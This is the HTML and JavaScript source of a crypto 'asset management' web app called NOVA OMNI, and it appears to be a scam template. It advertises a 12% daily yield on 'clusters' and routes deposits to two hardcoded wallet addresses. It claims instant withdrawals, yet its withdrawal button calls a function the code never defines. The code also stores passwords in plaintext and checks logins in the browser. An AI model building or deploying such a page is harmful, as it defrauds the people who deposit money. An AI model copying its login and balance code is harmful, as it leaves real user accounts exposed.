<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>NOVA OMNI | Professional Asset Management</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;600;800&display=swap" rel="stylesheet">
    <style>
        :root { --bg: #020617; --card: #0f172a; --accent: #10B981; --text: #f8fafc; --dim: #94a3b8; --gold: #fbbf24; }
        body { margin: 0; font-family: 'Plus Jakarta Sans', sans-serif; background: var(--bg); color: var(--text); overflow-x: hidden; padding-bottom: 100px; }
        
        /* Live Ticker Bar */
        #ticker { background: #1e293b; padding: 10px; font-size: 11px; font-weight: 800; white-space: nowrap; overflow: hidden; border-bottom: 1px solid rgba(16, 185, 129, 0.2); color: var(--accent); }
        .ticker-move { display: inline-block; animation: move 20s linear infinite; }
        @keyframes move { 0% { transform: translateX(100%); } 100% { transform: translateX(-100%); } }

        .glass { background: var(--card); border: 1px solid rgba(255,255,255,0.05); border-radius: 30px; padding: 20px; margin: 15px; box-shadow: 0 10px 30px rgba(0,0,0,0.3); }
        .btn-prime { width: 100%; padding: 18px; background: var(--accent); color: white; border: none; border-radius: 20px; font-weight: 800; cursor: pointer; transition: 0.3s; text-transform: uppercase; letter-spacing: 1px; }
        .btn-prime:active { transform: scale(0.96); }
        
        input, select { width: 100%; padding: 16px; background: #020617; border: 1px solid #334155; color: #fff; border-radius: 18px; margin-bottom: 15px; outline: none; font-family: inherit; }

        .app-header { padding: 15px 20px; background: rgba(15, 23, 42, 0.9); backdrop-filter: blur(15px); border-bottom: 1px solid rgba(255,255,255,0.05); display: flex; justify-content: space-between; align-items: center; position: sticky; top: 0; z-index: 1000; }
        .vip-badge { font-size: 9px; background: var(--gold); color: #000; padding: 4px 10px; border-radius: 50px; font-weight: 900; }

        /* Modern Node Grid */
        .node-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 15px; padding: 15px; }
        .node-card { background: var(--card); border-radius: 25px; padding: 15px; border: 1px solid rgba(255,255,255,0.03); text-align: center; transition: 0.3s; position: relative; overflow: hidden; }
        .node-card:hover { border-color: var(--accent); }
        .node-img { width: 100%; height: 90px; border-radius: 15px; object-fit: cover; margin-bottom: 10px; filter: brightness(0.8); }
        .yield-tag { position: absolute; top: 10px; right: 10px; background: var(--accent); color: white; font-size: 8px; padding: 3px 8px; border-radius: 8px; font-weight: 900; }

        .bottom-nav { position: fixed; bottom: 0; width: 100%; background: rgba(15, 23, 42, 0.95); display: flex; justify-content: space-around; padding: 15px 0; border-top: 1px solid #1e293b; z-index: 1000; }
        .nav-item { text-align: center; color: var(--dim); font-size: 10px; font-weight: 800; cursor: pointer; }
        .nav-item.active { color: var(--accent); }
        .nav-item i { font-size: 1.5rem; margin-bottom: 4px; }

        .screen { display: none; animation: fadeIn 0.4s ease-in-out; }
        .screen.active { display: block; }
        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
    </style>
</head>
<body>

    <div id="ticker"><div class="ticker-move">⚡ BTC: $64,231.50 (+2.4%) • ETH: $3,452.12 (+1.8%) • BNB: $582.40 • NEW CLUSTER V3 DEPLOYED • INSTANT WITHDRAWALS ENABLED • ⚡</div></div>

    <div id="auth-screen" style="min-height:100vh; display:flex; flex-direction:column; align-items:center; justify-content:center; padding:20px; background: radial-gradient(circle at top, #1e293b, #020617);">
        <h1 style="font-size:3.5rem; font-weight:900; letter-spacing:-3px; margin-bottom:20px;">NOVA<span style="color:var(--accent);">.</span></h1>
        <div class="glass" style="width:100%; max-width:380px;">
            <h3 id="auth-title" style="text-align:center; margin-bottom:20px;">Access Terminal</h3>
            <input type="text" id="username" placeholder="Username">
            <input type="password" id="password" placeholder="Passkey">
            <button class="btn-prime" onclick="handleAuth()">Login</button>
            <p onclick="toggleAuth()" id="toggleTxt" style="text-align:center; font-size:11px; color:var(--dim); margin-top:20px; cursor:pointer;">New Identity? <span style="color:var(--accent)">Register</span></p>
        </div>
    </div>

    <div id="app-main" style="display:none;">
        <header class="app-header">
            <div style="display:flex; align-items:center; gap:10px;">
                <div id="userIcon" style="width:35px; height:35px; background:var(--accent); border-radius:12px; display:flex; align-items:center; justify-content:center; font-weight:900;">N</div>
                <div><small id="userDisp" style="font-weight:900; display:block; line-height:1;">USER</small><span class="vip-badge" id="vipStatus">BASIC</span></div>
            </div>
            <button onclick="logout()" style="background:none; border:none; color:var(--dim); font-size:1.2rem;"><i class="fa-solid fa-power-off"></i></button>
        </header>

        <div id="home" class="screen active">
            <div class="glass" style="background: linear-gradient(135deg, #10B981, #064e3b); border:none;">
                <p style="font-size:10px; font-weight:800; opacity:0.8; text-transform:uppercase; letter-spacing:1px;">Net Portfolio Value</p>
                <h1 style="font-size:3.2rem; margin:10px 0; letter-spacing:-2px;" id="mainBal">$0.00</h1>
                <div style="display:flex; justify-content:space-between; border-top:1px solid rgba(255,255,255,0.1); padding-top:15px;">
                    <div><small style="color:rgba(255,255,255,0.6)">DAILY YIELD</small><br><b id="dayYield">+$0.00</b></div>
                    <div style="text-align:right;"><small style="color:rgba(255,255,255,0.6)">TOTAL PROFIT</small><br><b id="totProfit">$0.00</b></div>
                </div>
            </div>
            <h4 style="margin:25px 20px 10px; color:var(--dim); font-size:12px; letter-spacing:1px;">INSTITUTIONAL CLUSTERS</h4>
            <div id="nodeGrid" class="node-grid"></div>
        </div>

        <div id="vault" class="screen">
            <div class="glass">
                <h3 style="margin-top:0;"><i class="fa-solid fa-arrow-down-to-bracket" style="color:var(--accent)"></i> Deposit</h3>
                <select id="depMethod" onchange="updateAddr()">
                    <option value="MetaMask">MetaMask (USDT-ERC20)</option>
                    <option value="Trust">Trust Wallet (USDT-TRC20)</option>
                    <option value="Binance">Binance Transfer</option>
                </select>
                <div style="background:#020617; padding:15px; border-radius:15px; border:1px dashed #334155; margin-bottom:15px;">
                    <small style="color:var(--dim)">Network Address:</small>
                    <p id="walletAddr" style="font-size:10px; word-break:break-all; font-weight:800; color:var(--accent); margin:5px 0;">0xc270914e5a9e72C5994fb4bd9BbdD9A3425303f2</p>
                </div>
                <input type="number" id="depAmt" placeholder="Amount ($)">
                <input type="text" id="tid" placeholder="Transaction Hash/TID">
                <button class="btn-prime" onclick="submitDep()">Verify Deposit</button>
            </div>

            <div class="glass" style="border-top:4px solid #ef4444;">
                <h3 style="margin-top:0;"><i class="fa-solid fa-money-bill-transfer" style="color:#ef4444"></i> Withdrawal</h3>
                <input type="number" id="witAmt" placeholder="Amount ($)">
                <input type="text" id="witAddr" placeholder="Recipient Address">
                <button class="btn-prime" onclick="submitWit()" style="background:#ef4444;">Extract Funds</button>
            </div>
        </div>
    </div>

    <nav class="bottom-nav" id="nav-bar" style="display:none;">
        <div class="nav-item active" onclick="nav('home', this)"><i class="fa-solid fa-house"></i><br>HOME</div>
        <div class="nav-item" onclick="nav('vault', this)"><i class="fa-solid fa-vault"></i><br>VAULT</div>
        <div class="nav-item" onclick="nav('refer', this)"><i class="fa-solid fa-users-viewfinder"></i><br>TEAM</div>
        <div class="nav-item" onclick="nav('info', this)"><i class="fa-solid fa-shield-halved"></i><br>INFO</div>
    </nav>

    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
        import { getFirestore, doc, setDoc, getDoc, updateDoc, addDoc, collection, onSnapshot } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore.js";

        const firebaseConfig = { apiKey: "AIzaSyAXlQ1tKTJbcnIXNeww9I3d-ukzD7_mUCo", authDomain: "home-94d45.firebaseapp.com", projectId: "home-94d45", appId: "1:964390949419:web:589840cb91b7e42ecd506e" };
        const app = initializeApp(firebaseConfig);
        const db = getFirestore(app);

        let user = null; let bal = 0; let isLogin = true;

        window.toggleAuth = () => {
            isLogin = !isLogin;
            document.getElementById('auth-title').innerText = isLogin ? "Access Terminal" : "Initialize Identity";
            document.getElementById('toggleTxt').innerHTML = isLogin ? "New Identity? <span style='color:var(--accent)'>Register</span>" : "Have account? <span style='color:var(--accent)'>Login</span>";
        };

        window.handleAuth = async () => {
            const u = document.getElementById('username').value.toLowerCase().trim();
            const p = document.getElementById('password').value;
            if(!u || !p) return alert("Fields required!");
            const ref = doc(db, "users", u);
            const snap = await getDoc(ref);
            if(isLogin) {
                if(snap.exists() && snap.data().password === p) { sessionStorage.setItem("nova_user", u); start(); }
                else alert("Unauthorized!");
            } else {
                if(snap.exists()) return alert("Exists!");
                await setDoc(ref, { password: p, balance: 0, daily: 0, total: 0, rank: "BASIC" });
                alert("Identity Created!"); isLogin = true; toggleAuth();
            }
        };

        function start() {
            user = sessionStorage.getItem("nova_user");
            if(!user) return;
            document.getElementById('auth-screen').style.display = 'none';
            document.getElementById('app-main').style.display = 'block';
            document.getElementById('nav-bar').style.display = 'flex';
            document.getElementById('userDisp').innerText = user.toUpperCase();

            onSnapshot(doc(db, "users", user), (d) => {
                const data = d.data(); bal = data.balance;
                document.getElementById('mainBal').innerText = "$" + bal.toLocaleString();
                document.getElementById('dayYield').innerText = "+$" + (data.daily || 0).toLocaleString();
                document.getElementById('totProfit').innerText = "$" + (data.total || 0).toLocaleString();
                
                // VIP Status Logic
                let rank = "BASIC";
                if(bal > 1000) rank = "PRO";
                if(bal > 10000) rank = "WHALE";
                document.getElementById('vipStatus').innerText = rank;
            });
            renderNodes();
        }

        function renderNodes() {
            const grid = document.getElementById('nodeGrid'); grid.innerHTML = "";
            const prices = [30, 100, 250, 500, 1000, 2500, 5000, 10000, 20000, 30000];
            const imgs = ["1639762681485-074b7f938ba0", "1558494949-ef010cbdcc51", "1518770660439-4636190af475", "1640343136701-d051ff221245"];
            
            prices.forEach((p, i) => {
                const y = (p * 0.12).toFixed(2);
                grid.innerHTML += `<div class="node-card">
                    <span class="yield-tag">12% ROI</span>
                    <img src="https://images.unsplash.com/photo-${imgs[i%4]}?w=300" class="node-img">
                    <b style="font-size:11px; color:var(--dim);">CLUSTER V.${i+1}</b>
                    <h2 style="margin:5px 0; font-size:1.4rem;">$${p.toLocaleString()}</h2>
                    <p style="font-size:9px; color:var(--accent); margin-bottom:12px;">Yield: $${y}/day</p>
                    <button onclick="buy(${p})" style="width:100%; border:none; background:rgba(16,185,129,0.1); color:var(--accent); padding:10px; border-radius:12px; font-weight:800; font-size:10px;">ACTIVATE</button>
                </div>`;
            });
        }

        window.updateAddr = () => {
            const m = document.getElementById('depMethod').value;
            const addr = m === "MetaMask" ? "0xc270914e5a9e72C5994fb4bd9BbdD9A3425303f2" : "0xb584fBe3d7f1A72AEb2A0a76b1bC959841eC0A37";
            document.getElementById('walletAddr').innerText = addr;
        };

        window.submitDep = async () => {
            const amt = document.getElementById('depAmt').value;
            const t = document.getElementById('tid').value;
            if(!amt || !t) return alert("Fill data!");
            await addDoc(collection(db, "pending"), { user, amount: parseFloat(amt), tid: t, type: "Deposit", status: "Pending", time: Date.now() });
            alert("Deposit Broadcasted!");
        };

        window.buy = async (p) => {
            if(bal < p) return alert("Insufficient Capital!");
            if(confirm(`Activate Cluster for $${p}?`)) {
                await updateDoc(doc(db, "users", user), { balance: bal - p });
                alert("Node Operational!");
            }
        };

        window.nav = (id, el) => {
            document.querySelectorAll('.screen').forEach(s => s.classList.remove('active'));
            document.getElementById(id).classList.add('active');
            document.querySelectorAll('.nav-item').forEach(n => n.classList.remove('active'));
            el.classList.add('active');
        };

        window.logout = () => { sessionStorage.clear(); location.reload(); };
        if(sessionStorage.getItem("nova_user")) start();
    </script>
</body>
</html>
